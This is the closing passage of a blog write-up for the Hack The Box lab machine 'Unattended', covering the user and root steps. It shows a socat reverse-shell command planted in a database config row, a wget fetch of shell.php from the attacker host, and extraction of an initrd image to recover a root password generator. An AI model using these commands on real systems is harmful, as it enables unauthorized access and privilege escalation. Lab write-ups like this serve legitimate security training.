</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> config;</span><br><span class="line"></span><br><span class="line">+<span class="comment">-----+-------------------------+--------------------------------------------------------------------------+         </span></span><br><span class="line">| id  | option_name             | option_value                                                             |           </span><br><span class="line">+<span class="comment">-----+-------------------------+--------------------------------------------------------------------------+          </span></span><br><span class="line">|  54 | offline                 | 0                                                                        |          </span><br><span class="line">|  55 | offline_message         | Site offline, please come back later                                     |           </span><br><span class="line">|  56 | display_offline_message | 0                                                                        |          </span><br><span class="line">|  57 | offline_image           |                                                                          |         </span><br><span class="line">|  58 | sitename                | NestedFlanders                                                           |          </span><br><span class="line">|  59 | editor                  | tinymce                                                                  |         </span><br><span class="line">|  60 | captcha                 | 0                                                                        |         </span><br><span class="line">|  61 | list_limit              | 20                                                                       |          </span><br><span class="line">|  62 | access                  | 1                                                                        |         </span><br><span class="line">|  63 | debug                   | 0                                                                        |         </span><br><span class="line">|  64 | debug_lang              | 0                                                                        |          </span><br><span class="line">|  65 | dbtype                  | mysqli                                                                   |         </span><br><span class="line">|  66 | host                    | localhost                                                                |          </span><br><span class="line">|  67 | live_site               |                                                                          |          </span><br><span class="line">|  68 | gzip                    | 0                                                                        |         </span><br><span class="line">|  69 | error_reporting         | default                                                                  |         </span><br><span class="line">|  70 | ftp_host                | 127.0.0.1                                                                |          </span><br><span class="line">|  71 | ftp_port                | 21                                                                       |          </span><br><span class="line">|  72 | ftp_user                | flanders                                                                 |</span><br><span class="line">|  73 | ftp_pass                | 0e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466 |       </span><br><span class="line">|  74 | ftp_root                | /                                                                        |         </span><br><span class="line">|  75 | ftp_enable              | 1                                                                        |         </span><br><span class="line">|  76 | offset                  | UTC                                                                      |         </span><br><span class="line">|  77 | mailonline              | 1                                                                        |          </span><br><span class="line">|  78 | mailer                  | mail                                                                     |          </span><br><span class="line">|  79 | mailfrom                | nested@nestedflanders.htb                                                |         </span><br><span class="line">|  80 | fromname                | Neddy                                                                    |         </span><br><span class="line">|  81 | sendmail                | /usr/sbin/sendmail                                                       |          </span><br><span class="line">|  82 | smtpauth                | 0                                                                        |         </span><br><span class="line">|  83 | smtpuser                |                                                                          |         </span><br><span class="line">|  84 | smtppass                |                                                                          |         </span><br><span class="line">|  85 | smtppass                |                                                                          |         </span><br><span class="line">|  86 | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;                      |          </span><br><span class="line">|  87 | smtphost                | localhost                                                                |</span><br><span class="line">|  88 | smtpsecure              | none                                                                     |</span><br><span class="line">|  89 | smtpport                | 25                                                                       |</span><br><span class="line">|  90 | caching                 | 0                                                                        |</span><br><span class="line">|  91 | cache_handler           | file                                                                     |</span><br><span class="line">|  92 | cachetime               | 15                                                                       |</span><br><span class="line">|  93 | MetaDesc                |                                                                          |</span><br><span class="line">|  94 | MetaKeys                |                                                                          |</span><br><span class="line">|  95 | MetaTitle               | 1                                                                        |</span><br><span class="line">|  96 | MetaAuthor              | 1                                                                        |</span><br><span class="line">|  97 | MetaVersion             | 0                                                                        |</span><br><span class="line">|  98 | robots                  |                                                                          |</span><br><span class="line">|  99 | sef                     | 1                                                                        |</span><br><span class="line">| 100 | sef_rewrite             | 0                                                                        |</span><br><span class="line">| 101 | sef_suffix              | 0                                                                        |</span><br><span class="line">| 102 | unicodeslugs            | 0                                                                        |          </span><br><span class="line">| 103 | feed_limit              | 10                                                                       |         </span><br><span class="line">| 104 | lifetime                | 1                                                                        |          </span><br><span class="line">| 105 | session_handler         | file                                                                     |         </span><br><span class="line">+<span class="comment">-----+-------------------------+--------------------------------------------------------------------------+                                                                                                      </span></span><br><span class="line">52 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [neddy]&gt;</span><br></pre></td></tr></table></figure>
<p>The row with id 86 looks interesting. It has a value of some <code>perl</code> scripts :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;guly&#x2F;checkbase.pl;&#x2F;home&#x2F;guly&#x2F;checkplugins.pl;</span><br></pre></td></tr></table></figure>
<p>Apparently these scripts get executed from time to time, we can’t read these scripts or replace them, but we can change the value of that configuration from the database and put a reverse shell command. There’s no <code>nc</code> so I used <code>socat</code> :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [neddy]&gt; update config set option_value="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.xx.xx:443;" where id=86;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 0  Warnings: 0                                                     </span><br><span class="line"></span><br><span class="line">MariaDB [neddy]&gt; select * from config;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> config;                                                                       </span><br><span class="line"><span class="comment">----------------</span></span><br><span class="line"> Removed Output</span><br><span class="line"><span class="comment">----------------</span></span><br><span class="line">|  86 | checkrelease            | socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.xx.xx:443; |</span><br><span class="line"><span class="comment">----------------</span></span><br><span class="line"> Removed Output</span><br><span class="line"><span class="comment">----------------</span></span><br><span class="line">52 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [neddy]&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/unattended/18.png" alt=""><br>We owned user.</p>
<h2 id="initrd-Root-Flag"><a href="#initrd-Root-Flag" class="headerlink" title="initrd, Root Flag"></a>initrd, Root Flag</h2><p>After getting a shell as <code>guly</code> I terminated my <code>meterpreter</code> session as <code>www-data</code> and got a new one as <code>guly</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">guly@unattended:&#x2F;tmp$ wget http:&#x2F;&#x2F;10.10.xx.xx&#x2F;shell.php</span><br><span class="line">wget http:&#x2F;&#x2F;10.10.xx.xx&#x2F;shell.php</span><br><span class="line">--2019-08-23 13:25:49--  http:&#x2F;&#x2F;10.10.xx.xx&#x2F;shell.php</span><br><span class="line">Connecting to 10.10.xx.xx:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1110 (1.1K) [application&#x2F;octet-stream]</span><br><span class="line">Saving to: ‘shell.php’</span><br><span class="line"></span><br><span class="line">shell.php           100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]   1.08K  --.-KB&#x2F;s    in 0s</span><br><span class="line"></span><br><span class="line">2019-08-23 13:25:49 (100 MB&#x2F;s) - ‘shell.php’ saved [1110&#x2F;1110]</span><br><span class="line"></span><br><span class="line">guly@unattended:&#x2F;tmp$ php .&#x2F;shell.php</span><br><span class="line">php .&#x2F;shell.php</span><br><span class="line">&#x2F;*</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/unattended/19.png" alt=""><br>I noticed that <code>guly</code> was in the local group <code>grub</code>, I searched for files that are owned by this group :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">guly@unattended:&#x2F;tmp$ find &#x2F; -group grub</span><br><span class="line">find &#x2F; -group grub</span><br><span class="line">find: ‘&#x2F;proc&#x2F;tty&#x2F;driver’: Permission denied</span><br><span class="line">find: ‘&#x2F;proc&#x2F;1146&#x2F;task&#x2F;1146&#x2F;fd&#x2F;7’: No such file or directory</span><br><span class="line">find: ‘&#x2F;proc&#x2F;1146&#x2F;task&#x2F;1146&#x2F;fdinfo&#x2F;7’: No such file or directory</span><br><span class="line">find: ‘&#x2F;proc&#x2F;1146&#x2F;fd&#x2F;6’: No such file or directory</span><br><span class="line">find: ‘&#x2F;proc&#x2F;1146&#x2F;fdinfo&#x2F;6’: No such file or directory</span><br><span class="line">find: ‘&#x2F;lost+found’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;spool&#x2F;rsyslog’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;tmp&#x2F;vmware-root_861-3988621786’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;tmp&#x2F;vmware-root’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;tmp&#x2F;systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-Mjh5Or’: Permission denied           </span><br><span class="line">find: ‘&#x2F;var&#x2F;tmp&#x2F;systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-xDCH4o’: Permission denied  </span><br><span class="line">find: ‘&#x2F;var&#x2F;tmp&#x2F;systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-w07Cfj’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;tmp&#x2F;systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-90T8ai’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;log&#x2F;mysql’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;log&#x2F;apache2’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;vmware-caf&#x2F;pme&#x2F;data&#x2F;input&#x2F;monitor’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;vmware-caf&#x2F;pme&#x2F;data&#x2F;output’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;fastcgi’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;proxy’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;body’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;scgi’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;uwsgi’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;performance_schema’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;neddy’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;partial’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;cache&#x2F;ldconfig’: Permission denied</span><br><span class="line">find: ‘&#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;partial’: Permission denied</span><br><span class="line">find: ‘&#x2F;boot&#x2F;lost+found’: Permission denied</span><br><span class="line">&#x2F;boot&#x2F;initrd.img-4.9.0-8-amd64</span><br><span class="line">find: ‘&#x2F;root’: Permission denied</span><br><span class="line">find: ‘&#x2F;sys&#x2F;kernel&#x2F;debug’: Permission denied</span><br><span class="line">find: ‘&#x2F;etc&#x2F;ssl&#x2F;private’: Permission denied</span><br><span class="line">find: ‘&#x2F;etc&#x2F;vmware-tools&#x2F;GuestProxyData&#x2F;trusted’: Permission denied</span><br><span class="line">find: ‘&#x2F;tmp&#x2F;vmware-root_861-3988621786’: Permission denied</span><br><span class="line">find: ‘&#x2F;tmp&#x2F;vmware-root’: Permission denied</span><br><span class="line">find: ‘&#x2F;tmp&#x2F;systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-Mjh5Or’: Permission denied</span><br><span class="line">find: ‘&#x2F;tmp&#x2F;systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-xDCH4o’: Permission denied</span><br><span class="line">find: ‘&#x2F;tmp&#x2F;systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-w07Cfj’: Permission denied    </span><br><span class="line">find: ‘&#x2F;tmp&#x2F;systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-90T8ai’: Permission denied         </span><br><span class="line">find: ‘&#x2F;run&#x2F;log&#x2F;journal&#x2F;b0fa41b1a9b848e8b54df33b345577c8’: Permission denied</span><br><span class="line">find: ‘&#x2F;run&#x2F;systemd&#x2F;inaccessible’: Permission denied</span><br><span class="line">guly@unattended:&#x2F;tmp$</span><br></pre></td></tr></table></figure>
<p>I could only access <code>/boot/initrd.img-4.9.0-8-amd64</code>, so I created a directory in <code>/tmp</code> and copied it there.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">guly@unattended:&#x2F;tmp$ mkdir initrd</span><br><span class="line">mkdir initrd</span><br><span class="line">guly@unattended:&#x2F;tmp$ cd initrd</span><br><span class="line">cd initrd</span><br><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ cp &#x2F;boot&#x2F;initrd.img-4.9.0-8-amd64 .</span><br><span class="line">cp &#x2F;boot&#x2F;initrd.img-4.9.0-8-amd64 .</span><br><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 19256</span><br><span class="line">drwxr-xr-x  2 guly guly       60 Aug 23 13:34 .</span><br><span class="line">drwxrwxrwt 14 root root      300 Aug 23 13:34 ..</span><br><span class="line">-rw-r-----  1 guly guly 19715792 Aug 23 13:34 initrd.img-4.9.0-8-amd64</span><br><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$</span><br></pre></td></tr></table></figure>
<p><code>initrd</code> is the abbreviation for <a href="https://en.wikipedia.org/wiki/Initial_ramdisk" target="_blank" rel="noopener">initial ramdisk</a>.<br>Using <code>file</code> on it says that it’s a <code>gzip</code> archive :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 19256</span><br><span class="line">drwxr-xr-x  2 guly guly       60 Aug 23 13:55 .</span><br><span class="line">drwxrwxrwt 14 root root      300 Aug 23 13:55 ..</span><br><span class="line">-rw-r-----  1 guly guly 19715792 Aug 23 13:54 initrd.img-4.9.0-8-amd64</span><br><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ file initrd.img-4.9.0-8-amd64</span><br><span class="line">file initrd.img-4.9.0-8-amd64</span><br><span class="line">initrd.img-4.9.0-8-amd64: gzip compressed data, last modified: Fri Aug 23 09:26:41 2019, from Unix</span><br></pre></td></tr></table></figure>
<p>I renamed it to <code>initrd.img-4.9.0-8-amd64.gz</code>  then I used <code>gzip</code> to extract it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ mv initrd.img-4.9.0-8-amd64 initrd.img-4.9.0-8-amd64.gz</span><br><span class="line">4.gznitrd.img-4.9.0-8-amd64 initrd.img-4.9.0-8-amd64</span><br><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ gzip -d initrd.img-4.9.0-8-amd64.gz</span><br><span class="line">gzip -d initrd.img-4.9.0-8-amd64.gz</span><br><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 60656</span><br><span class="line">drwxr-xr-x  2 guly guly       60 Aug 23 13:56 .</span><br><span class="line">drwxrwxrwt 14 root root      300 Aug 23 13:56 ..</span><br><span class="line">-rw-r-----  1 guly guly 62110208 Aug 23 13:54 initrd.img-4.9.0-8-amd64</span><br></pre></td></tr></table></figure>
<p>The new file is a <code>cpio</code> archive :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ file initrd.img-4.9.0-8-amd64</span><br><span class="line">file initrd.img-4.9.0-8-amd64</span><br><span class="line">initrd.img-4.9.0-8-amd64: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>
<p>To extract it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ cpio -idvm &lt; initrd.img-4.9.0-8-amd64</span><br></pre></td></tr></table></figure>
<p>After extracting it we get a lot of files :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 60664</span><br><span class="line">drwxr-xr-x 11 guly guly      260 Aug 23 13:56 .</span><br><span class="line">drwxrwxrwt 14 root root      300 Aug 23 13:57 ..</span><br><span class="line">drwxr-xr-x  2 guly guly     3600 Aug 23 13:56 bin</span><br><span class="line">drwxr-xr-x  2 guly guly       60 Aug 23 13:56 boot</span><br><span class="line">drwxr-xr-x  3 guly guly      120 Aug 23 13:56 conf</span><br><span class="line">drwxr-xr-x  5 guly guly      240 Aug 23 13:56 etc</span><br><span class="line">-rwxr-xr-x  1 guly guly     5960 Apr 23  2017 init</span><br><span class="line">-rw-r-----  1 guly guly 62110208 Aug 23 13:54 initrd.img-4.9.0-8-amd64</span><br><span class="line">drwxr-xr-x  8 guly guly      180 Aug 23 13:56 lib</span><br><span class="line">drwxr-xr-x  2 guly guly       60 Aug 23 13:56 lib64</span><br><span class="line">drwxr-xr-x  2 guly guly       40 Aug 23 05:26 run</span><br><span class="line">drwxr-xr-x  2 guly guly     1140 Aug 23 13:56 sbin</span><br><span class="line">drwxr-xr-x  8 guly guly      220 Aug 23 13:56 scripts</span><br><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$</span><br></pre></td></tr></table></figure>
<p>Searching for <code>guly</code> in these files reveals this interesting comment in a script called <code>cryptroot</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ grep -r guly *             </span><br><span class="line">grep -r guly *</span><br><span class="line">Binary file initrd.img-4.9.0-8-amd64 matches           </span><br><span class="line">scripts&#x2F;local-top&#x2F;cryptroot:      # guly: we have to deal with lukfs password sync when root changes her one</span><br></pre></td></tr></table></figure>
<p>I checked that part of the script :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">         <span class="keyword">if</span> [ ! -e <span class="string">"<span class="variable">$NEWROOT</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="comment"># guly: we have to deal with lukfs password sync when root changes her one</span></span><br><span class="line"><span class="keyword">if</span> ! crypttarget=<span class="string">"<span class="variable">$crypttarget</span>"</span> cryptsource=<span class="string">"<span class="variable">$cryptsource</span>"</span> \</span><br><span class="line">  /sbin/uinitrd c0m3s3f0ss34nt4n1 | <span class="variable">$cryptopen</span> ; <span class="keyword">then</span></span><br><span class="line">                          message <span class="string">"cryptsetup: cryptsetup failed, bad password or options?"</span></span><br><span class="line">                          sleep 3</span><br><span class="line">                          <span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
<p>This line <code>/sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen</code> generates root password and pipes it to <code>$cryptopen</code>. We don’t have permission to execute <code>uinitrd</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ &#x2F;sbin&#x2F;uinitrd c0m3s3f0ss34nt4n1</span><br><span class="line">&#x2F;sbin&#x2F;uinitrd c0m3s3f0ss34nt4n1</span><br><span class="line">bash: &#x2F;sbin&#x2F;uinitrd: Permission denied</span><br><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$</span><br></pre></td></tr></table></figure>
<p>But in the extracted files we have the same binary and we can execute it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 60664</span><br><span class="line">drwxr-xr-x 11 guly guly      260 Aug 23 13:56 .</span><br><span class="line">drwxrwxrwt 14 root root      340 Aug 23 14:02 ..</span><br><span class="line">drwxr-xr-x  2 guly guly     3600 Aug 23 13:56 bin</span><br><span class="line">drwxr-xr-x  2 guly guly       60 Aug 23 13:56 boot</span><br><span class="line">drwxr-xr-x  3 guly guly      120 Aug 23 13:56 conf</span><br><span class="line">drwxr-xr-x  5 guly guly      240 Aug 23 13:56 etc</span><br><span class="line">-rwxr-xr-x  1 guly guly     5960 Apr 23  2017 init</span><br><span class="line">-rw-r-----  1 guly guly 62110208 Aug 23 13:54 initrd.img-4.9.0-8-amd64</span><br><span class="line">drwxr-xr-x  8 guly guly      180 Aug 23 13:56 lib</span><br><span class="line">drwxr-xr-x  2 guly guly       60 Aug 23 13:56 lib64</span><br><span class="line">drwxr-xr-x  2 guly guly       40 Aug 23 05:26 run</span><br><span class="line">drwxr-xr-x  2 guly guly     1140 Aug 23 13:56 sbin</span><br><span class="line">drwxr-xr-x  8 guly guly      220 Aug 23 13:56 scripts</span><br><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$ ls -la sbin | grep uinitrd</span><br><span class="line">ls -la sbin | grep uinitrd</span><br><span class="line">-rwxr-x---   1 guly guly 933240 Aug 23 05:26 uinitrd</span><br><span class="line">guly@unattended:&#x2F;tmp&#x2F;initrd$</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/unattended/20.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/helpline/">Hack The Box - Helpline</a><br>Next Hack The Box write-up : <a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-08-24</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/code-analysis/" rel="tag">#code-analysis</a> <a class="tag-link" href="/tags/firewall/" rel="tag">#firewall</a> <a class="tag-link" href="/tags/lfi/" rel="tag">#lfi</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#sqli</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
